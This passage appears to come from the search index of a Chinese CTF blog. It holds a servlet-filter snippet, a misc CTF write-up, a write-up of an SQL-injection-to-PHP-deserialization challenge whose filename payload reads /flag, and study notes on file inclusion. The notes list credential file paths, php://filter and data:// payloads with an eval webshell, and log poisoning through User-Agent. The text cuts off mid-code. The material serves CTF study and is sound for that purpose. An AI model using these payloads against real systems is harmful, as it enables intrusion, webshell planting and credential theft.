的声明顺序决定。，然后响应经过的Filter就是相反的\n&lt;filter-mapping&gt;    &lt;filter-name&gt;EncodingFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;AuthFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;LogFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;\n\n这个顺序就是从上到下\n使用注解的时候Servlet容器会按照 类加载顺序或 @WebFilter 中的 @WebFilter(value, dispatcherTypes, initParams) 定义顺序\n使用注解感觉不好配置执行顺序啊\n","tags":["Java","Web"]},{"title":"[安洵杯_2019]easy_misc","url":"/2025/10/19/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-misc/","content":"[安洵杯_2019]easy_misc这个题目虽然不是很难，但是考到了很多东西以及做题的思路，还是很有必要的\n解压得到\n\n\n1.掩码爆破尝试了一下发现decode不是伪加密，然后打开发现提示\n\n\n我们进行计算结果为7，然后发现7直接加上后面不是密码，猜测7是掩码的数量，遇到这种给出一部分密码然后又有一个数字的优先猜测是掩码爆破\n然后就是爆破遇到位数超过六位的优先尝试纯数字，因为6位如果加上字母和数字就需要好几分钟了\n\n\n爆出来是，没想到后面那个逗号也是\n2019456NNULLULL,\n\n解压出来得到\n\n\n\n\n2.盲水印我们将那张图片使用foremost进行提取，拿到两张一样的图片，直接猜测是盲水印\n\n\n我们进行提取发现没有东西，然后看了题解不知道为什么加个--oldseed就行了\npython bwmforpy3.py decode 2.png 1.png out.png --oldseed\n\n然后看了一下介绍就是使用这个配置可以让python3中使用python2的随机数生成算法\n所以提取不出来也可能是算法的原因\n然后提取出来\n\n\n在11.txt中\n3.字频分析我们打开read文件夹中有很多txt文件，有一个hint.txt文件\nhint:取前16个字符\n\n然后其他txt文件全是一篇英文文章，结合前面的线索，我们只需要对11.txt进行字频分析然后转化为对应的编码即可拼接出flag\n最后字频分析结果除去空格就是\netaonrhisdluygw\n\n和decode.txt转化就成了\nQW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE/WSFTajBtcw=\n\n然后解密就失败了然后这里猜测是Base64编码是没有-的，于是不会考的是我们要把r字符对应的-sd给删除掉吗，那后面要去掉的5REtRQ又是，为什么，这个只能说明是题目的问题了\n官方题解的密文是\nQW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw==\n\n先进行Base64解密然后再Base85解码\n\n\nflag\nflag&#123;have_a_good_day1&#125;\n\n\n\n\n\n\n\n","tags":["Misc","掩码爆破"]},{"title":"[安洵杯_2019]不是文件上传","url":"/2025/05/03/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":"[安洵杯_2019]不是文件上传又是一道难题\n我们访问题目发现这是一个文件上传的题目，但是题目说不是文件上传，而且我试了一下好像白名单只允许图片后缀的文件上传，于是只能先放弃文件上传\n而且我们文件上传也没有告诉我们文件路径，而是返回文件id\n看了wp发现这个题目原来是有源码的，我们把相关的重要源码拿到\n&lt;?php// 定义一个名为 helper 的类，用于处理图片上传和相关操作class helper &#123;    // 定义一个受保护的属性 $folder，用于存储上传图片的文件夹路径    protected $folder = &quot;pic/&quot;;    // 定义一个受保护的属性 $ifview，用于控制文件查看功能是否可用，初始值为 False    protected $ifview = False;    // 定义一个受保护的属性 $config，用于指定配置文件的名称    protected $config = &quot;config.txt&quot;;    // 注释说明该类中的某些功能还不完善，尚未开放    // 定义一个公共方法 upload，用于处理图片上传操作，默认表单文件字段名为 &quot;file&quot;    public function upload($input=&quot;file&quot;)    &#123;        // 调用 getfile 方法获取上传文件的相关信息        $fileinfo = $this-&gt;getfile($input);        // 初始化一个空数组 $array，用于存储文件的详细信息        $array = array();        // 将文件的标题信息存入数组        $array[&quot;title&quot;] = $fileinfo[&#x27;title&#x27;];        // 将文件名存入数组        $array[&quot;filename&quot;] = $fileinfo[&#x27;filename&#x27;];        // 将文件扩展名存入数组        $array[&quot;ext&quot;] = $fileinfo[&#x27;ext&#x27;];        // 将文件存储路径存入数组        $array[&quot;path&quot;] = $fileinfo[&#x27;path&#x27;];        // 使用 getimagesize 函数获取上传图片的尺寸信息，返回一个数组        $img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);        // 从尺寸信息数组中提取图片的宽度和高度，存入新数组 $my_ext        $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);        // 使用 serialize 函数将 $my_ext 数组序列化为字符串，并将其存入 $array 数组的 &quot;attr&quot; 键中        $array[&quot;attr&quot;] = serialize($my_ext);        // 调用 save 方法将文件信息保存到数据库，并获取保存后的记录 ID        $id = $this-&gt;save($array);        // 如果保存操作返回的 ID 为 0，表示保存失败，输出错误信息并终止脚本        if ($id == 0)&#123;            die(&quot;Something wrong!&quot;);        &#125;        // 输出换行符        echo &quot;&lt;br&gt;&quot;;        // 输出上传成功的提示信息，包含图片的 ID        echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is $id.&lt;/p&gt;&quot;;    &#125;    // 定义一个公共方法 getfile，用于获取上传文件的相关信息    public function getfile($input)    &#123;        // 检查 $input 是否被设置        if(isset($input))&#123;            // 调用 check 方法对上传文件的信息进行检查，并将结果存储在 $rs 中            $rs = $this-&gt;check($_FILES[$input]);        &#125;        // 返回检查后的文件信息        return $rs;    &#125;    // 定义一个公共方法 check，用于检查上传文件的合法性    public function check($info)    &#123;        // 生成一个唯一的文件名，使用当前时间和唯一 ID 进行 MD5 加密，截取中间 16 位        $basename = substr(md5(time().uniqid()),9,16);        // 获取上传文件的原始文件名        $filename = $info[&quot;name&quot;];        // 从文件名中提取文件扩展名        $ext = substr(strrchr($filename, &#x27;.&#x27;), 1);        // 定义一个允许上传的文件扩展名数组        $cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);        // 检查上传文件的扩展名是否在允许的扩展名数组中        if(!in_array($ext,$cate_exts))&#123;            // 如果不在允许的扩展名数组中，输出错误信息并终止脚本            die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);        &#125;        // 从文件名中去除扩展名，得到文件标题        $title = str_replace(&quot;.&quot;.$ext,&#x27;&#x27;,$filename);        // 返回一个包含文件标题、文件名、扩展名和存储路径的数组        return array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);    &#125;    // 定义一个公共方法 save，用于将文件信息保存到数据库    public function save($data)    &#123;        // 检查 $data 是否为空或不是数组        if(!$data || !is_array($data))&#123;            // 如果条件满足，输出错误信息并终止脚本            die(&quot;Something wrong!&quot;);        &#125;        // 调用 insert_array 方法将文件信息插入数据库，并获取插入记录的 ID        $id = $this-&gt;insert_array($data);        // 返回插入记录的 ID        return $id;    &#125;    // 定义一个公共方法 insert_array，用于将数组数据插入数据库    public function insert_array($data)    &#123;        // 连接到本地 MySQL 数据库，使用用户名 &quot;r00t&quot;、密码 &quot;r00t&quot; 和数据库名 &quot;pic_base&quot;        $con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);        // 检查数据库连接是否失败        if (mysqli_connect_errno($con))        &#123;            // 如果连接失败，输出错误信息并终止脚本            die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());        &#125;        // 初始化一个空数组 $sql_fields，用于存储 SQL 语句中的字段名        $sql_fields = array();        // 初始化一个空数组 $sql_val，用于存储 SQL 语句中的字段值        $sql_val = array();        // 遍历 $data 数组，将字段名和字段值分别存储到 $sql_fields 和 $sql_val 数组中        foreach($data as $key=&gt;$value)&#123;            // 对字段名中的特殊字符进行替换            $key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $key);            // 对字段值中的特殊字符进行替换            $value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $value);            // 将处理后的字段名添加到 $sql_fields 数组中，并添加反引号            $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;            // 将处理后的字段值添加到 $sql_val 数组中，并添加单引号            $sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;;        &#125;        // 构建 SQL 插入语句，将字段名和字段值分别用逗号连接        $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;        // 执行 SQL 插入语句        mysqli_query($con, $sql);        // 获取插入记录的 ID        $id = mysqli_insert_id($con);        // 关闭数据库连接        mysqli_close($con);        // 返回插入记录的 ID        return $id;    &#125;    // 定义一个公共方法 view_files，用于查看文件内容    public function view_files($path)&#123;        // 检查 $ifview 属性是否为 False        if ($this-&gt;ifview == False)&#123;            // 如果为 False，返回 False，表示文件查看功能不可用            return False;            // 注释说明该功能还不完善，尚未开放        &#125;        // 使用 file_get_contents 函数读取文件内容        $content = file_get_contents($path);        // 输出文件内容        echo $content;    &#125;    // 定义析构函数，当对象被销毁时自动调用    function __destruct()&#123;        # 读取一些配置文件的内容        // 调用 view_files 方法读取配置文件内容        $this-&gt;view_files($this-&gt;config);    &#125;&#125;?&gt;\n\n\n\n&lt;?phpinclude(&quot;./helper.php&quot;);$show = new show();if($_GET[&quot;delete_all&quot;])&#123;\tif($_GET[&quot;delete_all&quot;] == &quot;true&quot;)&#123;\t\t$show-&gt;Delete_All_Images();\t&#125;&#125;$show-&gt;Get_All_Images();class show&#123;\tpublic $con;\tpublic function __construct()&#123;\t\t$this-&gt;con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);\t\tif (mysqli_connect_errno($this-&gt;con))&#123;    \t\t\tdie(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());\t\t&#125;\t&#125;\tpublic function Get_All_Images()&#123;\t\t$sql = &quot;SELECT * FROM images&quot;;\t\t$result = mysqli_query($this-&gt;con, $sql);\t\tif ($result-&gt;num_rows &gt; 0)&#123;\t\t    while($row = $result-&gt;fetch_assoc())&#123;\t\t    \tif($row[&quot;attr&quot;])&#123;\t\t    \t\t$attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]);\t\t\t\t\t$attr = unserialize($attr_temp);\t\t\t\t&#125;\t\t        echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;\t\t    &#125;\t\t&#125;else&#123;\t\t    echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;\t\t&#125;\t\tmysqli_close($this-&gt;con);\t&#125;\tpublic function Delete_All_Images()&#123;\t\t$sql = &quot;DELETE FROM images&quot;;\t\t$result = mysqli_query($this-&gt;con, $sql);\t&#125;&#125;?&gt;\n\n我们仔细阅读这两个php代码，一个是储存文件，一个则是展示图片的代码。这些代码真的好长，看了好久。\n我们先看helper.php中需要注意到的地方\nprotected $ifview = False;//在源代码中ifview是false $img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]); // 从尺寸信息数组中提取图片的宽度和高度，存入新数组 $my_ext $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]); // 使用 serialize 函数将 $my_ext 数组序列化为字符串，并将其存入 $array 数组的 &quot;attr&quot; 键中 $array[&quot;attr&quot;] = serialize($my_ext);//这里面对我们的一个文件数据进行了一个序列化，但好像还没用$key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $key);$value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\\0\\0\\0&#x27;, $value);//对我们文件的数据的字段名和值进行一个特殊字符的替换public function view_files($path)&#123;        // 检查 $ifview 属性是否为 False        if ($this-&gt;ifview == False)&#123;            // 如果为 False，返回 False，表示文件查看功能不可用            return False;            // 注释说明该功能还不完善，尚未开放        &#125;        // 使用 file_get_contents 函数读取文件内容        $content = file_get_contents($path);        // 输出文件内容        echo $content;    &#125;//这里面我们需要让ifview为true，我们才能使用文件查看功能function __destruct()&#123;        # 读取一些配置文件的内容        // 调用 view_files 方法读取配置文件内容        $this-&gt;view_files($this-&gt;config);    &#125;//我们可以通过这里去读取/flag\n\n但是helper.php中只是定义了这些函数，并没有去调用，我们再来看show.php\npublic function Get_All_Images()&#123;\t\t$sql = &quot;SELECT * FROM images&quot;;\t\t$result = mysqli_query($this-&gt;con, $sql);\t\tif ($result-&gt;num_rows &gt; 0)&#123;\t\t    while($row = $result-&gt;fetch_assoc())&#123;\t\t    \tif($row[&quot;attr&quot;])&#123;\t\t    \t\t$attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]);\t\t\t\t\t$attr = unserialize($attr_temp);\t\t\t\t&#125;\t\t        echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;\t\t    &#125;\t\t&#125;else&#123;\t\t    echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;\t\t&#125;\t\tmysqli_close($this-&gt;con);\t&#125;//这个函数执行了sql语句并输出了 if filename path \n\n到现在其实思路有点断了，不知道那里进行反序列化，只能看wp了\n看了wp后也是知道了那个替换的作用，由于我们需要反序列化config和ifview的值。但是其为protect属性变量\nprotected 属性在序列化后的字符串中会被表示为：\n\\x00*\\x00属性名//十六进制\\0*\\0//十进制  当我们的序列化数据传入就会被替换为\\0\\0\\0\n\n\n\n看了很久，终于是看懂了wp了，自己还是太菜了，比赛的时候该怎么办啊\n整体思路是围绕着sql语句展开的，除了对文件后缀有限制，没有对我们的文件名有什么特别严格的过滤，导致sql中的value我们可以自定义。我们通过在第一个参数title注释后面语句，然后我们就可以控制我们其他无法直接通过文件上传决定的值\n我们看show.php中进行反序列化的是\n$attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]);$attr = unserialize($attr_temp);\n\n我们只需把反序列化数据放入attr这个一列即可\n我们则先构造pop链，其实没什么好构造的，直接把ifview&#x3D;true和config&#x3D;&#x2F;flag，就会在触发destruct的时候读取flag了\n但其实想了半天也不知道为什么能把\\0*\\0换成\\0\\0\\0，protected不存在这种前缀。但是还是怪我没有仔细看题目\nif($row[&quot;attr&quot;])&#123;$attr_temp = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]);$attr = unserialize($attr_temp);&#125;\n\n在show.php中把我们的内容又替换回来了，但是这样岂不是不换前缀也可以反序列化成功\n&lt;?phpclass helper &#123;    protected $ifview = True;    protected $config = &quot;/flag&quot;;&#125;$a = new helper();echo serialize($a);?&gt;//O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\\0*\\0ifview&quot;;b:1;s:9:&quot;\\0*\\0config&quot;;s:5:&quot;/flag&quot;;&#125;//O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\\0\\0\\0ifview&quot;;b:1;s:9:&quot;\\0\\0\\0config&quot;;s:5:&quot;/flag&quot;;&#125;\n\n拿到pop链后我们直接来看sql语句\n$sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;; //会在我们的数据用&#x27;&#x27;包裹起来，直接放到sql语句里面就可以用$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;\n\nimplode那一部分不用管，我们需要看的是php代码中sql语句是用&quot;&quot;闭合的，我们序列化数据也是用的双引号，我们为了不打乱sql语句，我们需要进行16进制编码\n0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d\n\n然后我们直接开始闭合，我们的title作为第一个参数可控，我们需要控制的则是attr最后一个参数，总共有五个参数\nreturn array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);\n\npayload\n1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.png\n\n经过测试，还是需要把\\0*\\0变为\\0\\0\\0，不知道为什么\n"},{"title":"文件包含漏洞","url":"/2025/02/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","content":"文件包含漏洞笔记前言又到了前言，文件上传漏洞感觉差不多了，于是开始文件包含漏洞，只要是因为感觉和文件上传类似\n什么是文件包含漏洞\n和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。\n什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。\n有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。\n以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\n区别如下:\n\nrequire():找不到被包含的文件会产生致命错误，并停止脚本运行\n\ninclude():找不到被包含的文件只会产生警告，脚本继续执行\n\nrequire_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含\n\ninclude_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含\n\n\n漏洞成因\n我们先直接来看一个简单的例子，网页代码如下:\n&lt;?php\tinclude $_GET[&#x27;test&#x27;];?&gt;\n\n再创建一个phpinfo.php页面，代码如下:\n&lt;?php\tphpinfo();?&gt;\n\n利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析\n\n\n将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:\n可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。\n在上一期的文件上传漏洞的总结中，我们上传了一个jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用\n1.本地文件包含漏洞能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)测试网页包含如下代码：\n&lt;?php\t$file=$_GET[&#x27;filename&#x27;];\tinclude($file);?&gt;\n\n利用该代码，我们可以读取一些系统本地的敏感信息。例如:C:\\Windows\\system.ini文件。\n使用绝对路径\n使用绝对路径直接读取:如日志文件(&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log)\n使用相对路径\n通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置，在linux中同样适用。\n一些常见的敏感目录信息路径:Windows系统:\n\nC:\\boot.ini &#x2F;&#x2F;查看系统版本\n\nC:\\windows\\system32\\inetsrv\\MetaBase.xml &#x2F;&#x2F;IIS配置文件\n\nC:\\windows\\repair\\sam &#x2F;&#x2F;存储Windows系统初次安装的密码\n\nC:\\ProgramFiles\\mysql\\my.ini &#x2F;&#x2F;Mysql配置\n\nC:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F;MySQL root密码\n\nC:\\windows\\php.ini &#x2F;&#x2F;php配置信息\n\n\nLinux&#x2F;Unix系统:\n\n&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息\n\n&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息\n\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件\n\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置\n\n&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置\n\n&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件\n\n&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件\n\n\n2.php伪协议为什么从伪协议开始，主要是因为其他看不懂，只有php好看一点\n1.file:&#x2F;&#x2F;协议file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响\n语法：\nfile:// [文件的绝对路径和文件名]\n\n2.php:&#x2F;&#x2F;协议php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;filter用于读取源码。php:&#x2F;&#x2F;input用于执行php代码。\n1.php:&#x2F;&#x2F;filterphp:&#x2F;&#x2F;filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。\n语法：\nphp://filter/convert.base64-encode/resource=文件路径\n\n我们来看下ctf show 78关\n源码：\nif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\ninclude函数会访问传入的文件，并以php执行，如果执行不成功则返回文件源码。\n我们传入：\nfile=php://filter/convert.base64-encode/resource=flag.php\n\nPHP伪协议把flag.php进行base64编码，导致无法执行返回源码，我们是拿着源码去解码就可以看到文件内容了\n至于我们为什么知道flag.php的位置，现在我只有一种方法，就是使用system()函数去找(话说，能用system()了，找到直接访问不就行了^_^)\n2.php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n也就是说，我们只要让include()执行php:&#x2F;&#x2F;input，就可以让post请求中的内容以php执行\n利用条件:\n\nallow_url_fopen ：off&#x2F;on\nallow_url_include：on\n\n利用该方法，我们可以直接写入php文件，输入file=php://input，然后使用burp抓包，写入php代码：\n3.过滤器现在是5月21日，发现php://filter在使用的时候会出现base被过滤的情况，但是这个绕过实际上非常简单，只需要使用其他过滤器就行了，但实际上我根本不怎么记得有哪些过滤器可以使用，现在总结一下\n过滤器可以用于 任何支持流操作的伪协议，只要数据流经过 PHP 的流处理层。常见组合包括：\n\n\n\n伪协议\n是否支持过滤器\n说明\n\n\n\nphp://filter\n✅ 完全支持\n专门设计用于过滤器链。\n\n\nphp://input\n✅ 支持\n可对 HTTP 请求原始数据（如 POST）进行过滤（需在 allow_url_include=On 时）。\n\n\nphp://output\n✅ 支持\n对输出流（如 echo、print）应用过滤器。\n\n\nphp://memory\n✅ 支持\n对内存临时流应用过滤器。\n\n\nphp://temp\n✅ 支持\n对临时文件流应用过滤器。\n\n\nfile://\n✅ 支持\n本地文件读写时过滤（如 file_get_contents()）。\n\n\ndata://\n✅ 支持\n对 data: URI 内容过滤（需 allow_url_include=On）。\n\n\nhttp:// &#x2F; https://\n❌ 不支持\n网络流默认不经过 PHP 过滤器层（需额外扩展或自定义流上下文）。\n\n\nftp:// &#x2F; zip://\n❌ 不支持\n协议本身不支持过滤器。\n\n\n基本语法\nphp://filter/[过滤器链]/resource=[文件或流]\n\n\n过滤器链：多个过滤器用 | 分隔，按顺序处理。\nresource：目标文件或流（如 resource=index.php）。\n\n字符串过滤器\n对字符串进行简单转换：\n\n\n\n过滤器\n作用\n示例\n\n\n\nstring.rot13\nROT13 编码（字母位移13位）\nHello → Uryyb\n\n\nstring.toupper\n转大写\nabc → ABC\n\n\nstring.tolower\n转小写\nABC → abc\n\n\nstring.strip_tags\n去除 HTML&#x2F;PHP 标签\n&lt;b&gt;Hi&lt;/b&gt; → Hi\n\n\n实例:\n// 读取文件并转为大写$content = file_get_contents(&#x27;php://filter/read=string.toupper/resource=file.txt&#x27;);\n\n\n\n转换过滤器\n处理字符编码或数据格式：\n\n\n\n过滤器\n作用\n示例\n\n\n\nconvert.base64-encode\nBase64 编码\nABC → QUJD\n\n\nconvert.base64-decode\nBase64 解码\nQUJD → ABC\n\n\nconvert.quoted-printable-encode\nQuoted-Printable 编码\né → =C3=A9\n\n\nconvert.quoted-printable-decode\nQuoted-Printable 解码\n=C3=A9 → é\n\n\nconvert.iconv.*\n字符集转换（需指定编码）\nUTF-8 → ISO-8859-1\n\n\n实例\n// 写入文件时 Base64 编码file_put_contents(&#x27;php://filter/write=convert.base64-encode/resource=output.txt&#x27;, &#x27;Hello&#x27;);//字符集转换的一些payloadfile=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.phpfile=php://filter/convert.iconv.utf8.utf16/resource=flag.php\n\n我们在使用字符集转换绕过的时候原理就是通过原始数据进行两次字符集转换从而导致&lt;?等php标志性受到损坏从而无法被识别为php代码直接输出\n\n\n有时候可能无法直接看出来，但从源代码看会发现好多不可见字符，从而导致php结构受到损坏\n压缩过滤器\n压缩或解压数据流：\n\n\n\n过滤器\n作用\n\n\n\nzlib.deflate\nGzip 压缩\n\n\nzlib.inflate\nGzip 解压\n\n\nbzip2.compress\nBzip2 压缩\n\n\nbzip2.decompress\nBzip2 解压\n\n\n实例\n// 读取压缩文件并解压$content = file_get_contents(&#x27;php://filter/read=zlib.inflate/resource=compressed.gz&#x27;);\n\n\n\n加密过滤器\n通过 OpenSSL 加密&#x2F;解密数据：\n\n\n\n过滤器\n作用\n\n\n\nmcrypt.*\n（已废弃，PHP 7.1+ 移除）\n\n\nopenssl.*\n使用 OpenSSL 加密（需配置密钥）\n\n\n实例\n// 使用 OpenSSL 加密写入文件$params = [    &#x27;key&#x27; =&gt; &#x27;my-secret-key&#x27;,    &#x27;iv&#x27;  =&gt; &#x27;initialization-vector&#x27;,];file_put_contents(&#x27;php://filter/write=openssl.encrypt/cipher=aes-256-cbc/resource=encrypted.txt&#x27;, &#x27;Data&#x27;, 0, stream_context_create([&#x27;ssl&#x27; =&gt; $params]));\n\n\n\n\n\n2.data:&#x2F;&#x2F;协议data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。\n利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：利用条件:\n\nallow_url_fopen ：on\nallow_url_include：on\n\n语法：\ndata://text/plain,&lt;?php phpinfo();?&gt;//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nctf show 79关\n源码：\nif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\n过滤掉了php,我们有如下输入：\nfile=data://text/plain,&lt;?=@eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n完美避免了php的出现，直接蚁剑连接\n3.zip:&#x2F;&#x2F;协议zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。\n\nzip:&#x2F;&#x2F;中只能传入绝对路径。\n要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）\n只需要是zip的压缩包即可，后缀名可以任意更改。\n相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;\n\n利用条件:\n\nallow_url_fopen ：off&#x2F;on\nallow_url_include：off&#x2F;on\n\n语法：\nzip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt\n\n其他\n\n3.Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。\n利用条件\n\n对日志文件可读\n知道日志文件时储存目录\n一般情况下日志储存目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf …)或者根据phpinfo()中信息得知\n日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式\n\n在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log\n默认路径：\n/var/log/nginx/access.log\n\n如果我们访问一个不存在的资源，也一样会进行记录\nctf show 80\n我们首先通过user-agent 向日志文件中写入一句话后门\n\n\nphp代码消失，即被解析掉了\n\n\n我们用蚁剑连接即可\n4.配合文件上传使用有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。\n以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:\n&lt;?php\tfwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&lt;?php 